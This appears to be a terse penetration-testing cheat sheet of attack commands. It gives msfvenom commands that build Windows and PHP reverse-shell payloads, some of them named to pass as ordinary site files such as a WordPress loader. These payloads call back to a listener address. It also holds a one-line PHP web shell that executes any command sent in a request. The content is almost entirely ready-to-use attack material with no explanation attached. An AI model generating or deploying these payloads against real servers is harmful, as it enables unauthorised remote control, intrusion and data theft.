### aspx

    msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.46 LPORT=4444 -f aspx -o rshell.aspx

### php  

    msfvenom -p php/reverse_php LHOST=10.10.17.46 LPORT=4444 -f raw -o testwp-load.php

<?php system($_REQUEST["cmd"]); ?>
